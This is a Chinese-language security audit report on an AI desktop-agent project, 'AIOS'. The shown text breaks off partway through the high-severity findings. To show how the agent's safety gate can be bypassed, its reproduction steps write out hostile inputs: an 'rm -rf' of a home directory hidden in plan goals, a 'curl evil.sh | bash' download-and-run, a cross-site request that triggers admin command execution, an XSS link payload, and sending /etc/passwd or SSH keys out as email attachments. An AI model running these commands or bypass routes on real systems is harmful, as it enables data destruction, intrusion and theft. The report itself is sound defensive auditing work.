# Agent_OS_v1.0（AIOS_V0.1）全量代码审计报告 · bugFind

> **审计性质**：只读审计。**未改动、未修复、未新增任何项目源码文件**（仅新增本报告）。
> **审计对象**：`C:\Users\keyal\Desktop\AIOS\AIOS_V0.1` 全量工程文件。
> **审计日期**：2026-09-14
> **审计方法**：全量人工阅读 + 静态结构核对 + 独立只读探针动态验证（探针脚本运行后已删除，未驻留）。

---

## 0. 审计范围与方法

### 0.1 覆盖文件（38 个源文件 + 文档 + 产物）

| 区域 | 文件 | 行数 |
|------|------|------|
| 入口 | `main.py` | 151 |
| 入口（根重复副本） | `host_agent.py` | 403 |
| 入口（根重复副本） | `task_planner.py` | 248 |
| 组1 用户交互层 | `group_1/__init__.py`(20) `ai_shell.py`(74) `host_agent.py`(687) `task_planner.py`(248) | 1029 |
| 组2 决策规划层 | `group_2/__init__.py`(19) `control_detector.py`(175) `route_policy.py`(153) `task_planner.py`(344) | 691 |
| 组3 执行层 | `group_3/__init__.py`(15) `app_agent.py`(259) `atspi_io.py`(285) `automator.py`(334) `coord_check.py`(179) | 1072 |
| 组4 工具服务层 | `src/__init__.py`(38) `interfaces.py`(241) `tool_registry.py`(206) `skill_library.py`(453) `default_tools.py`(373) `real_tools.py`(301) `mcp_connector.py`(265) `web_automation.py`(695) `stats.py`(130) `stats_buffered.py`(164) `batch_executor.py`(275) `llm_client.py`(124) `mock_registry.py`(98) `mock_skills.py`(97) | 3460 |
| 组5 系统协调层 | `group_5/__init__.py`(16) `coordinator.py`(328) `security.py`(161) `rag.py`(96) | 601 |
| GUI | `gui/server.py`(719) `gui/index.html`(966) | 1685 |
| 测试 | `tests/test_integration_v10.py` | 722 |
| 技能包 | `.agents/skills/agent-os-dev/`（SKILL.md + 3 references + 2 scripts） | — |
| 文档/产物 | `README.md` `docs/*.md` `hnu_intro.md` `system_out/` `out/` `demo_task_backup.zip` | — |

### 0.2 验证手段（可复现）

| 手段 | 结果 |
|------|------|
| `python -m compileall -q .`（全量语法） | **True**（0 语法错误 —— 说明"重复定义 / 不可达代码"全是合法 Python，静态检查抓不到） |
| `import main` | **OK** |
| 只读探针 ×5（安全闸门绕过、规划参数污染、路径归一、幂等口径、前端符号定义） | 全部命中，证据见各条目"复现"段 |
| 全局 grep（死函数/死调用点/重复定义） | 见 §6 |
| 文档与实现逐条对照 | 见 §7 |

### 0.3 缺陷统计

| 严重度 | 数量 | 含义 |
|--------|------|------|
| **P0 致命** | **12** | 不可逆数据破坏 / 可被外部利用的代码执行通道 / 核心流程崩溃或系统性谎报 |
| **P1 高危** | **25** | 安全边界或接口契约失效、功能与声称不符、明确逻辑错误 |
| **P2 中危** | **78** | 健壮性、一致性、并发、性能、可维护性 |
| **P3 低危** | **19** | 死代码、命名/注释错位、文档不一致、仓库卫生 |
| **合计** | **134** | 覆盖 31 个文件 |

> **编号勘误（2026-09-15，依据第三方复核 `bugFind_verify_20260915.md`）**：本报告
> 初版 §0.3/§1 误记为「P1=29 / P2=46 / 合计 106」，与正文实际编号
> （`P1-01…P1-25`、`P2-01…P2-78`）不符；上表已按**正文实际编号**更正为
> P0=12 / P1=25 / P2=78 / P3=19 / **合计 134**。另有个别条目的事实描述与严重度
> 经复核校准（确认 117 / 部分成立 16 / 驳回 1），逐条见 **§12 复核勘误**。

**分布**：`group_5/security.py` 12 条 · `src/` 22 条 · `group_1` 11 条 · `group_2/3` 26 条 · `gui/` 26 条 · 工程一致性 9 条。

---

## 1. 结论摘要

这套工程在"**功能演示**"层面是成立的（编译通过、主链路能跑、五组契约字段齐全、文档写得比代码完整），但在"**安全承诺**"与"**双轨一致性**"两个核心自述卖点上是**不成立的**：

1. **"四层安全"实际只有第 1 层（关键字黑名单）在跑**，而且这一层本身可以被完全绕过：`security.check()` 只把**顶层** `params.cmd` 拼进检测面，LLM 只要把危险命令写进 `goals[].params.cmd` 就能拿到 `approved=True, risk_level=low`（P0-01，已实测）。第 3 层签名验证、第 4 层隐私脱敏**从未被任何代码调用**（P0-03 / P1-01）。
2. **提权确认流在非交互路径等于不存在**：`AppAgent` 的 `confirmer` 缺省是"永远同意"，`main.py build()` 与 `gui build_system()` 都没注入真人确认（P0-07）。于是"黑名单绕过 + 任意 `run_command` + 自动提权"构成完整链路：**从一句自然语言到以 ADMIN 身份执行任意系统命令**。
3. **GUI 服务端全部 POST 接口无 CSRF/Origin/Content-Type 校验**（P0-08），本地任意网页可用 CORS 简单请求跨站 POST `/api/call`（`level=admin`）或 `/api/orchestrate`。与上一条组合后，**浏览器里打开一个恶意页面即可在本机执行系统命令**。
4. **路径归一存在"找不到就回落工作区"的静默改写**，而 `delete_file` 属非目录级动作、不做存在性校验 → 用户说"删除某个不存在的东西"，实际删除的是**整个默认工作区**（P0-05，已实测）。同时 `PROTECTED_PATHS` 不含 `/home`、`~`、`/var`、`/opt`、`/tmp`（P1-02），"删光用户主目录"没有任何拦截。
5. **前端缺两个函数定义**（`loadChatHistory` / `saveChatHistory`）：页面加载时脚本在中间抛 `ReferenceError` 而中断，后续 `loadLLM()/loadSMTP()/loadSettings()` 与 `#hash` 直达全部不执行；每次对话成功还会被 catch 改写成"请求失败"（P0-11）。另有 `esc()` 不转义引号导致的属性逃逸型 XSS（P0-12）。
6. **Mock/真实双轨承诺被反向破坏**：`web_*` 五个工具在 CDP 不可用时返回 `success=True + simulated=True`，审计、统计、对账全部按"成功"计（P0-10）；而 `tests/test_integration_v10.py::test_web_tools_mock_degrade` **把这个行为写成了断言**，等于把缺陷固化成契约，永远不会被回归发现。
7. **三份规划器、两份 HostAgent 已实质分叉**（P1-21/22）：根 `task_planner.py` 与 `group_1/task_planner.py` 字节完全相同，但都与真正在跑的 `group_2/task_planner.py` 不同。按 `SKILL.md` 指引去改 "task_planner.py" 的人，有 2/3 概率改到死文件。
8. **文档系统性夸大**：`docs/testing.md` 列出的 8 个测试文件（126 个用例）在本工程**只存在 1 个**（`tests/test_integration_v10.py`，13 个用例）；`docs/验证报告.md` 的验证用例 #19「截个屏然后发到 3179160953@qq.com」在规则路径下**根本识别不出 send_email**（P1-08 实测）。

**建议处理顺序**：P0-01/02/07/08（安全链路）→ P0-04/05 + P1-02（不可逆数据破坏面）→ P0-06/11/12（执行与前端）→ P0-03/09/10（承诺一致性）→ P1 其余 → 架构专题（§6）→ §7 文档与卫生。

---

## 2. P0 致命缺陷（12 条）

---

### P0-01　安全闸门只看顶层 `params.cmd`，goal 级危险命令完全绕过

- **位置**：`group_5/security.py:57-75`（`check()`，检测面拼接在 64 行）
- **现象**：`check()` 里 `cmd = str(params.get("cmd",""))` 只读 **intent 顶层** `params`；而真正的执行语义藏在 `intent["goals"][i]["params"]` 里。把 `rm -rf /home/keyal --no-preserve-root` 放进 `goals[1].params.cmd`、顶层 `params={}`、`user_text` 用一句无害话，`check()` 返回 **`{'approved': True, 'risk_level': 'low', 'layer': 4}`**。
- **根因**：`blob = f"{action} {target} {cmd} {intent.get('user_text','')}"` —— 四层检查全部只在这一个字符串上做；`goals` 从未被展开。`_dangerous()` / `_protected()` / `_risk_of()` 也都只接收顶层字段。
- **影响**：项目自述"组1 之后必须过安全闸门""危险命令拦截"**在 LLM 多目标输出下完全失效**。LLM 幻觉或提示注入（如用户要求"顺手帮我清理一下"被扩写成 `run_command`）会直接穿过"四层安全"。这是整套安全设计的地基性缺陷。
- **复现**（探针实测）：
  ```python
  from group_5.security import SecuritySandbox
  SecuritySandbox().check({
    "intent": "文件操作", "action": "organize", "target": "/home/keyal/ws", "params": {},
    "user_text": "帮我整理一下文件",
    "goals": [{"action": "organize", "params": {"path": "/home/keyal/ws"}},
              {"action": "run_command", "params": {"cmd": "rm -rf /home/keyal --no-preserve-root"}}]})
  # → {'approved': True, 'risk_level': 'low', ...}
  ```

---

### P0-02　单步 step 形态（无 `user_text`）同样绕过黑名单

- **位置**：`group_5/security.py:57-64`；调用方 `group_5/coordinator.py:227`（反思重试）、审计对账路径
- **现象**：安全层 docstring 自称"对一条意图**或一个计划步骤**做四层检查"，但计划步骤 dict 里没有 `user_text`。`check({"action":"run_command","params":{"cmd":"curl http://evil.sh | bash"},"target":""})` → **`approved=True, risk_level='low'`**。
- **根因**：`curl … | bash` 不在 `DANGEROUS_KEYWORDS` 里；`_risk_of("run_command", …)` 落到 `return "low"`（`security.py:138-145` 的 default 分支）——**系统命令竟然按最低风险定级**。
- **影响**：任何未命中黑名单关键词的"下载执行 / 反弹 shell / 数据外发"命令都以 low 风险放行；配合 P0-07 自动提权 → 直接执行。
- **复现**：见上探针；另 `_risk_of` 对 `run_command` 无专门分支，与 `delete_file/cleanup_temp=medium` 形成反差。

---

### P0-03　第 3 层"签名验证"从未生效、且逻辑本身是坏的

- **位置**：`group_5/security.py:97-113`（`register_signature` / `_verify_signatures`）
- **现象**：`register_signature()` **全项目零调用点**（grep 实测，只有定义处）；且即使被调用，`_verify_signatures()` 的取函数逻辑必然 `continue`：
  ```python
  mod = __import__(name, fromlist=[""]) if "." in name else None
  func = getattr(mod, name, None) if mod else None
  ```
  非点号名 → `mod=None` → `func=None` → 跳过；点号名 → `__import__("a.b")` 返回的是**顶层包 a**，再 `getattr(a, "a.b")` 必然失败 → 仍跳过。实测：登记后再调用 `_verify_signatures()` 恒返回 `[]`。
- **根因**：把"模块名"和"函数名"混在一个字符串里当 `__import__` 的 target；同时 `SecuritySandbox.__init__` 里 `self.signatures` 的初始化被 `add_protected` 里的不可达赋值覆盖了语义（见 P3-01）。
- **影响**：docstring 声称"对组4 工具函数源码做 SHA-256 清单核对（检测注册后被篡改）"是**纯声明**。审计理由串却会打印"签名核对 N 项"，给出**已核对的假证据**（`check()` 第 91 行）。
- **复现**：
  ```python
  sb.register_signature("copy_file", dt.copy_file)   # 成功返回摘要
  sb._verify_signatures()                            # → []（无论是否篡改）
  ```

---

### P0-04　`delete_file` 递归删除无确认/无回收站，且主目录不在受保护清单

- **位置**：`src/default_tools.py:127-140`（`delete_file`）、`src/default_tools.py:32-38`（`PROTECTED_PATHS`）
- **现象**：`delete_file` 对目录直接 `shutil.rmtree(target)` —— 不可逆、不落回收站、不备份、无二次确认；工具权限是默认 `USER`（schema 未声明 permission），执行层默认身份就是 `USER` → **零门槛直通**。而 `PROTECTED_PATHS` 只有 `/etc /usr /root /boot /bin /sbin /lib /proc /sys /dev` + 三个 Windows 目录：`/home`、`~`、`/var`、`/opt`、`/srv`、`/tmp`、`/media`、`/mnt` **全部不在内**。实测 `_protected("/home/keyal")` → `None`、`_protected("~")` → `None`。
- **根因**：受保护清单按"Linux 系统目录"枚举，漏掉了用户数据区；`~` 写法未做 `expanduser` 后的反向匹配补全（虽然 `delete_file` 内部已 `resolve()`，但 `/home/keyal` 本就不在清单里）。
- **影响**：`delete_file("~")` / `delete_file("/home/keyal")` → 整份用户主目录被递归删除且无任何拦截。与 P0-05 叠加后，**用户不需要说错话就会触发**。
- **复现**：`python -c "from src.default_tools import _is_protected_path as f; print(f('/home/keyal'), f('~'), f('/var/log'))"` → `None None None`。**（请勿真跑 `delete_file`）**

---

### P0-05　组1"找不到路径就回落工作区" + 组2 路径白名单 → 「删除不存在的路径」= 删除整个工作区

- **位置**：`group_1/host_agent.py:557-572`（`_resolve_target`）、`group_2/task_planner.py:199-217`（`_fill_params` 兜底填充）
- **现象**：`_resolve_target()` 对"绝对但不存在"的路径**无脑回退 `default_target`**（第 564 行 `return expanded if os.path.exists(expanded) else default_target`）。`_finalize_intent` 的路径细化循环只覆盖 `path/src/directory` 三个键且对非目录级动作（`delete_file` 不在 `_DIR_SCOPE_ACTIONS`）直接 `continue`，**不兜底**；于是 `intent["target"]` 已被改写成工作区。进到组2，`delete_file` 缺 `path` → 兜底 filler = `target`（工作区）→ 在 Linux 上工作区以 `/` 开头，白名单放行 → `params["path"] = "<工作区>"`。
- **实测**：`understand_intent("删除 /home/keyal/重要资料", default_target=<ws>)` → `target = <ws>`（工作区路径），`goals=[{"action":"delete_file","description":"删除文件或目录"}]`（**没有 path，只靠组2 填**）。
- **根因**：两处设计目标不同的规则叠加：① 组1 把"解析失败"等同于"用默认工作区"（本意是给 organize 这类目录级动作兜底）；② 组2 的 filler 填充不区分"目录级动作"与"具体文件动作"。
- **影响**：**不可逆数据破坏，且是高概率路径**——"删除那个临时文件"（文件已不存在）、"删掉旧报告"（名字记错）、LLM 幻觉出一个不存在的路径，三种情况全部退化成"删除整个工作区"。`security.check` 对 `delete_file` 只判 `target.rstrip('/') in ("", "/")`（`security.py:74`），工作区路径不在其中 → `approved=True, risk_level=medium` → 无确认执行。
- **复现**：见上；`organize/find_duplicates/backup`（目录级）落到工作区是**设计意图**，`delete_file`（文件级）落到工作区是**事故**。

---

### P0-06　`Automator.open_app` 用 `os.system` 拼接 shell 字符串执行

- **位置**：`group_3/automator.py:242-244`
  ```python
  if shutil.which(desktop):
      os.system(f"nohup {desktop} >/dev/null 2>&1 &")
      return {"message": f"已启动 {desktop}", "simulated": False}
  ```
- **现象**：`desktop` 来自 `params.app`（即 LLM 产出的 app 名，经 `_resolve_desktop` 只做子串映射，无字符白名单），直接进 shell 字符串。此外这条分支**不检查返回码**，与上一分支（`gtk-launch` 有 `r.returncode == 0` 校验）形成不一致，会**谎报"已启动"**。
- **根因**：为兼容 `zcode` 等无 .desktop 的应用而引入的"直接执行二进制"兜底，用了最不安全的 `os.system` 拼接而非 `subprocess.Popen([desktop], start_new_session=True)`。
- **影响**：① 潜在命令注入（`shutil.which` 需命中真实二进制名，风险被压缩，但只要存在同名二进制 + 参数拼接点即成立，属于"设计层面不可接受"）；② 无返回码校验 → 假成功进入审计 PASS（与 P1-16 的"失败必须可见"红线同源）。
- **复现**：`inspect.getsource(Automator.open_app)` 含 `os.system(` 且含 `nohup`（探针实测 True）。

---

### P0-07　提权确认流缺省"永远同意"，CLI/GUI 均未注入真人确认

- **位置**：`group_3/app_agent.py:43-56`（`confirmer = confirmer or (lambda info: True)`）、`main.py:70-89`（`build()` 未传 confirmer）、`gui/server.py:49-63`（`build_system()` 未传 confirmer）、`gui/server.py:118-122`（`apply_settings` 默认 `escalation_confirm="auto"`）
- **现象**：`AppAgent` 缺省 `confirmer` 恒返回 `True`；两处装配都没注入人工确认；GUI 的默认设置是 `自动同意（演示模式）`。于是"权限不足 → 请求用户确认 → ADMIN 重试一次"的提权流，在**所有非交互路径上直接跳过"请求用户确认"这一步**。而 `TaskPlanner.plan()` 无条件在计划末尾追加 `requires_admin=True` 的 `run_command(echo [plan done])`（`group_2/task_planner.py:90-95`），所以**每一次编排都会自动完成一次 USER→ADMIN 提权**，"提权流是演示"变成了"提权是常态"。
- **根因**：把"测试/演示便利"作为缺省值（`lambda info: True`），而真正的交互确认只在 `AIShell`（未接线）与 GUI 前端按钮上部分实现。
- **影响**：与 P0-01/P0-02 组合 → **一句自然语言即可在本机以 ADMIN 身份执行任意命令**："四层安全（危险命令→沙箱→签名→隐私）"中的沙箱层（第 2 层）也只在 `run_command(sandbox=True)` 显式传参时才生效，而规划器生成的收尾步骤从不传 `sandbox`。
- **复现**：`main.py --text "…"` 走 `orchestrate()`，审计日志里每次都能看到 `escalations` 有一条 `run_command`；`grep -n "confirmer" gui/server.py main.py` 除 `apply_settings` 外无注入点。

---

### P0-08　GUI 服务端全部 POST 接口无 CSRF / Origin / Content-Type 校验

- **位置**：`gui/server.py:291-298`（`_body()`）、`gui/server.py:397-405`（`do_POST`）
- **现象**：`_body()` 只看 `Content-Length` 就直接 `json.loads`，**不校验 `Content-Type`、不校验 `Origin`/`Referer`、无 token**。危险的 POST 端点包括：`/api/call`（`level=admin` 直接调 `run_command`）、`/api/skill`、`/api/orchestrate`、`/api/plan`+`/api/execute`、`/api/settings`（可追加受保护路径/换工作区）、`/api/smtp_save`（写 SMTP 凭据）、`/api/llm_config`（写 LLM Key）、`/api/rag_clear`、`/api/reset_stats`。
- **根因**：定位为"仅绑定 127.0.0.1"就认为安全；但浏览器对 `http://127.0.0.1:8788` 的**跨站请求不受同源策略阻止**——`Content-Type: text/plain` 的简单请求不触发预检，直接打到服务端，服务端也不检查来源。
- **影响**：用户在本机浏览器打开任意页面（含被投毒的技术博客/广告 iframe）→ 该页面内的 JS 即可：`fetch('http://127.0.0.1:8788/api/call',{method:'POST',headers:{'Content-Type':'text/plain'},body:JSON.stringify({name:'run_command',params:{cmd:'…'},level:'admin'})})` → **本机任意命令执行**。这是本项目最容易被外部利用的通道。
- **复现**：`grep -n "Origin\|Referer\|csrf\|CSRF\|Content-Type" gui/server.py` → `_body()` 无相关校验（仅 `/api/chat` 请求体里出现 Content-Type 字样）。

---

### P0-09　`/api/orchestrate` 兼容路由一步到底（auto 确认）

- **位置**：`gui/server.py:471-486`
- **现象**：该路由内部 `SYSTEM.plan_only(text)` → 直接 `SYSTEM.execute_approved(..., confirm_mode="auto")`，**完全绕开** `/api/plan` + 确认面板 + `/api/execute` 的两阶段流。注释写"供未强刷的旧缓存页面使用"。
- **根因**：接口重构时保留了旧端点做兼容，但旧端点自带"无人值守执行"语义。
- **影响**：与 P0-08 组合 → **零交互的一步式 RCE**；即使不考虑 CSRF，任何残留的旧页面缓存也会把需要人工确认的计划直接执行掉（含真实发邮件、提权命令）。
- **复现**：源码可见；`grep -n "confirm_mode=\"auto\"" gui/server.py` → 命中该处。

---

### P0-10　`web_*` 系列工具在通道不可用时仍返回 `success=True`

- **位置**：`src/web_automation.py:503-505`（web_open）、`531-534`（web_click）、`545-548`（web_state）、`559-561`（web_extract）、`611-614`（web_search）
- **现象**：`except CDPError as e: return {"success": True, "result": f"[Mock] …", "simulated": True}` —— 把"什么都没发生"返回成**成功**。文档反复声明"绝不把没发生的点击谎报成真实成功"，实际只保证了 `result` 里有 `[Mock]` 字样，**`success` 字段本身仍然是 true**。
- **根因**：把 `simulated` 当作"免责标记"，但下游所有判断只看 `success`。
- **影响**：① `SystemCoordinator._consistent()` / 审计 verdict 判 **PASS**；② `ToolStats` 记成 success，成功率虚高；③ GUI"执行明细"显示绿勾；④ 最严重：`tests/test_integration_v10.py::test_web_tools_mock_degrade` **断言 `r["success"] is True` 且 `r.get("simulated")`**（第 351-352 行）→ 把该缺陷固化为"期望行为"，从此永远不会被回归发现。这与项目自述红线"失败必须可见"直接冲突。
- **复现**：`AIOS_WEB_BROWSER=/nonexistent AIOS_CDP_PORT=59999 python -c "from src.web_automation import web_open; print(web_open('https://example.com'))"` → `{'success': True, 'result': '[Mock] …', 'simulated': True}`。

---

### P0-11　前端 `loadChatHistory()` / `saveChatHistory()` 未定义 → 启动脚本中断 + 每次对话报错

- **位置**：`gui/index.html:955`（`loadChatHistory()` 调用）、`348`（页签点击调用）、`527`（`clearChat` 调用 `saveChatHistory`）、`607`、`688`（`sendChat` 调用 `saveChatHistory`）
- **现象**：两个函数**全文件无定义**（grep `function loadChatHistory|function saveChatHistory` → 无匹配；调用共 5 处）。
  1. 顶层 `initTools(); loadRuns(); loadChatHistory(); loadLLM(); loadSMTP(); loadSettings();` —— `loadChatHistory()` 抛 `ReferenceError`，其**后面的 `loadLLM()/loadSMTP()/loadSettings()` 与 `#hash` 直达逻辑全部不执行**（LLM 页/设置页首屏数据为空）。
  2. `sendChat()` 第 688 行 `if(full){…; saveChatHistory()}` 抛错 → 落入 `catch`（691 行）→ **把已渲染好的回答气泡改成 `✗ 请求失败: ReferenceError: saveChatHistory is not defined`**。也就是说：对话功能"看起来每次失败"，实际上 LLM 回复成功了。
  3. `clearChat()` 每次抛错。
- **根因**：后端已实现 `/api/chat_history`（GET）与 `/api/chat_save`（POST），前端调用点也写好了，**但两个 fetch 包装函数漏写**。属于典型的"最后一步没接上"。
- **影响**：核心可见功能（对话助手）表现为不可用；设置页/LLM 页首屏不加载；`#tools/#stats/#llm/#settings` 直达链接失效；控制台每轮对话刷一条红错。
- **复现**：打开控制台 Console，或在「对话助手」发一条消息，观察回答气泡被错误信息替换。

---

### P0-12　`esc()` 不转义引号 + `mdRender` 的 href 拼接 → 属性逃逸型 XSS

- **位置**：`gui/index.html:338`（`esc`）、`627-633`（`mdRender` → `inline`）、`599`（`addBubble("assistant", res.answer).innerHTML = mdRender(res.answer)`）、`754`（`value="${esc(String(p.default))}"`）
- **现象**：`esc` 只做 `& < >` 三个替换，**不含 `"` 和 `'`**。`inline()` 里：
  ```js
  .replace(/\[([^\]]+)\]\((https?:[^)\s]+)\)/g,'<a href="$2" target="_blank" rel="noopener">$1</a>')
  ```
  字符类 `[^)\s]+` **允许包含双引号**。因此 LLM 输出（或 `web_extract` 抓来的第三方网页正文，经 `llm_answer` 回显）中出现
  `[点我](https://a.com" onmouseover="alert(document.cookie))`
  即被拼成 `<a href="https://a.com" onmouseover="alert(1)" target=…>` → 在气泡内执行脚本。
- **根因**：把"HTML 转义"理解成"防标签"，忽略了**属性上下文**还需要转义引号；且信任了 `https?:` 前缀就代表 URL 安全。
- **影响**：XSS 的输入源是**不可信外部内容**（LLM 输出、网页正文、搜索结果标题），属于存储/反射混合型。在本系统语境下危害放大：控制台同源可调 `/api/call`（P0-08）→ 从"弹窗"升级为"脚本代打本地工具接口"。
- **复现**：在「对话助手」发 `请原样复述：[x](https://a.com" onmouseover="alert(1))`，观察生成的 `<a>` 标签；或直接 `mdRender('[x](https://a.com" onmouseover="alert(1))')`。

---

## 3. P1 高危缺陷（29 条）

### 3.1 安全与权限

**P1-01　第 4 层"隐私保护"零调用**
`group_5/security.py:147-156` 的 `redact()` **全项目无调用点**（grep 实测）；`check()` 只把敏感字段**名字**写进 reason（`leaked` 列表），不脱敏内容。审计 JSONL（`audit_log.jsonl` 555 行）、`session_log.json`、`stats.json` 里的 `params` 全部**明文入库**——包括 `send_email` 的收件人、`llm_config` 的 Key（见 P1-07）。docstring 的"审计入库前对邮箱/密钥类敏感串打码"是纯声明。

**P1-02　受保护路径清单口径窄且两份不一致**
`group_5/security.py:26-29` 与 `src/default_tools.py:32-38` 两份 `PROTECTED_PATHS` 实测**不相同**：`default_tools` 多出 `c:\windows / c:\program files / c:\program files (x86)`，`security` 一份都没有；两份都**不含** `/home /var /opt /srv /tmp /media /mnt ~`（实测 `_protected()` 对 `/home/keyal`、`~`、`/var/log`、`/opt` 全返回 `None`）。命令黑名单口径也不一致：`default_tools` 有 `chmod -r 777`，`security` 没有。**"与组4 闸门口径一致"是假的。**

**P1-03　黑名单漏网与误伤（实测）**
`src/default_tools.py:23-30` / `group_5/security.py:21-25`。漏网：`curl http://evil.sh | bash`、`find ~ -delete`、`mv /home/a/* /tmp/`、`truncate -s 0 /home/keyal/x`、`> ~/.bashrc`、`wget -O- x|sh`、`python -c "open('/etc/passwd')"` 全部**返回 None（放行）**。误伤：`"format"` 是裸子串 → `python -c "print(format(1,'b'))"` 被判定"危险操作: format"；任何含 `dd ` / `format` 的文件名或参数都会被拒。
根因：黑名单模式（枚举特征串）本质上既拦不全也拦不准，本应配合白名单/解析（`shlex.split` + 首命令判定）。

**P1-04　受保护路径拦截会误拦整条指令**
`group_5/security.py:70-73`：`prot = self._protected(target) or self._protected(cmd) or self._protected(str(intent.get("user_text","")))` —— 把**用户原话**也拿去正则匹配。用户只要说"这个配置跟 /etc 下那个一样，帮我复制到桌面"，整条指令被判"受保护路径 /etc"直接拒绝。语义上应只校验**实际操作路径**，而不是话语里出现的任意字符串。

**P1-05　`send_email` 附件无受保护路径校验、无大小上限**
`src/real_tools.py:163-188`：`apath = Path(str(att)).expanduser()` → `is_file()` → `msg.add_attachment(apath.read_bytes(), …)`。没有 `_is_protected_path` 调用（实测源码中不含该符号）、没有 `MAX_*` 限制（实测 `False`）。→ `send_email(to=…, attachment="/etc/passwd")`、`~/.ssh/id_rsa`、`~/.workbuddy/…` 可被直接外发；读 2GB 文件会把内存打满。**这是 P1-02 缺口的对外利用面（数据外泄）。**

### 3.2 组1 意图层

**P1-06　规则路径完全没有 `write_file` / `run_command` / `take_screenshot` 触发词**
实测 `_RULES` 中不含这三个动作名。而 `_SYSTEM_PROMPT`（`group_1/host_agent.py:581-586`）却把 `write_file/run_command/take_screenshot` 作为可用 action 教给 LLM，文档与 `recipes.md` 也都以它们为例。→ **无 Key 的纯离线环境无法执行"写入文件"类指令**（实测 `understand_intent("把报告写到 /data/out/a.md 内容 hello")` → `goals = []`）；双轨（LLM/规则）能力不对等，而项目卖点正是"双轨可切换"。

**P1-07　邮箱规则不容忍空格，文档里的验证用例本身就识别不出**
`group_1/host_agent.py:65`：`(r"(发给|发送给|发到)\S*@\S+", "send_email", …)`。实测：
| 输入 | `_match_goals` 结果 |
|------|------|
| `把 /tmp/a.md 发给 a@b.com 主题是 hi` | `[]`（发给后有空格 → 正则失配） |
| `把 /tmp/a.md 发给a@b.com 主题是 hi` | `['send_email']` |
| `把报告发给 3179160953@qq.com` | `[]` ← **正是 `docs/验证报告.md` 第 19 条验证用例** |
| `把 /tmp/a.md 发邮件给 a@b.com` | `['send_email']`（靠另一条规则兜住） |
根因：`\S*@\S+` 紧贴"发给"，把中文口语里的自然空格当成语法边界。汉语句子里"发给"与邮箱之间**几乎总有空格**，所以实际上只有"发邮件/发送邮件"这条规则在干活。

**P1-08　`_resolve_target` 对"不存在"一律回落工作区（静默改写）**
`group_1/host_agent.py:557-572`。除了 P0-05 的破坏性后果，还有一类**功能性后果**：用户明确说"整理 /mnt/data"（挂载盘暂时未挂上）→ 系统不报错，而是**默默整理工作区**，只在 `unresolved` 里塞一句"目标 '…' 未在工作环境找到，已落到默认工作目录"，而该提示在 GUI 上永远不会显示（组2 返回体不含 `unresolved` 渲染）。**"静默改写用户意图"比报错更危险。**

**P1-09　附件抽取只认以 `/` 开头的绝对路径**
`group_1/host_agent.py:420-423`（`m_file`）与 `group_2/task_planner.py:170-175`（组2 兜底）正则均要求 `(/…)+`。实测 `understand_intent("把 hnu_intro.md 发给 a@b.com")` → `goals=[]`（规则失配叠加 P1-07）、即便 LLM 产出 send_email，裸文件名也不会被识别为附件。SKILL 红线 3 声称"话语中的真实文件路径强制覆盖 LLM 的 null"，与实现不符。

**P1-10　`repair_intent` 与 `_llm_intent` 双客户端并存**
`group_1/host_agent.py:24` 引入 `src/llm_client`，但同文件 `_llm_intent`（614-664 行）自己用 `urllib` 重写了一遍 OpenAI 兼容调用。两套超时（45s / 120s）、两套温度（`chat` 恒 0 / `_llm_intent` 用 `self.temperature`）、两套 markdown 剥离、两套错误处理。**配置源相同但行为不同**，出问题时排查要同时看两处；`recipes.md` 配方 8 描述的"通用文本 LLM 客户端"并未真正被组1 复用。

**P1-11　`plan_only()` 丢弃 `degraded`，前端降级警告是死代码**
`group_5/coordinator.py:59-113`：内部 `bundle["degraded"] = degraded` 设好了，但成功路径 `return {...}` 是**新建的 dict 字面量，不含 `degraded`**（实测返回键：`admin_steps, check, elements, intent, needs_confirm, plan, real_send_steps`）。→ `gui/server.py:508` 的 `staged.get("degraded", False)` 恒为 `False` → `index.html:386` 的"⚠ LLM 不可用，本计划由规则引擎粗略解析 —— 复杂任务建议稍后重试"**永不显示**。用户在最需要这条提示的场景（LLM 降级、规则引擎把长指令解析成垃圾计划）恰好看不到它。

### 3.3 组2/组3 规划与执行

**P1-12　`web_click` 的 `text` 被误标 required，导致提示词教的 `nth` 链路被参数污染**
`src/web_automation.py:666-678` 把 `text` 标为 `required=True`，但实现支持 `selector`/`nth` 单独使用。实测 `web_click(nth=1)` 经组2 后变成 `{'nth': 1, 'text': '.'}` —— 兜底 filler 把 `text` 填成 `"."`（`group_2/task_planner.py:198-217`）。当前因 `nth` 优先而侥幸可用，但：① 若日后 `nth` 与 `text` 同时生效，`"."` 会去匹配含句号的任意元素；② 若 `nth` 缺失而只有 `selector`，`text="."` 会污染定位。**必需参数声明与实际能力不一致。**

**P1-13　`_fill_params` 的"像路径"判据不支持 Windows 路径**
`group_2/task_planner.py:207-209`：`if pname in ("path","src","directory","dest") and not str(filler).startswith(("/","~",".")): continue`。Windows 工作区形如 `C:\Users\…` → 恒不通过 → **所有文件类动作在本机（Windows）拿不到 path/src，步骤被 drop**（实测 `goals=[]`、`target` 落到临时目录也填不进 path）。项目自述"可独立打包移植"，但移植到 Windows 后文件能力整体失效。

**P1-14　三份规划器 / 两份 HostAgent 已实质分叉**
根 `task_planner.py` 与 `group_1/task_planner.py` **sha256 完全相同**（`b1a6976b082c4a43`），但与在用的 `group_2/task_planner.py`（`5f9c881e572c4890`）不同：旧副本没有 `route_policy` 接入、没有 `click_element` GUI 动作、`create_folder` 还是 `Ctrl+Shift+N` 三步（新版是 `open_app 文件管理器 + wait + 三步`）、没有 `last_file_target`。根 `host_agent.py`（`ad79bd618eaf38c9`，403 行）与 `group_1/host_agent.py`（`433d18d822dd9e48`，687 行）分叉更彻底：旧副本没有 `_finalize_intent`/`repair_intent`/`detect_operation`/web 动作/目标排序 —— **即"红线 3 确定性归一"与"红线 2 组间解耦"的全部修复都不在里面**。两份文件均**零导入点**（grep 实测），是随时会误导维护者的定时炸弹。

**P1-15　`_risk_of` 不给 `run_command` 定级 + 沙箱层不可达**
`group_5/security.py:137-145`：`run_command` 落到 `return "low"`。`run_command` 的 schema 是 `PermissionLevel.ADMIN`、支持 `sandbox=True` 经 bwrap，但规划器生成的 `run_command` 步骤**从不设置 `sandbox`**（`group_2/task_planner.py:79-82` 收尾步骤只给 `cmd`），LLM 也极少主动给。→ 第 2 层"沙箱执行"在真实路径上**从不生效**；配合 P0-07 就是"以 ADMIN 身份、无沙箱、无确认执行任意命令"。

**P1-16　`_call_contract` 把"用户拒绝提权"也记成 escalations**
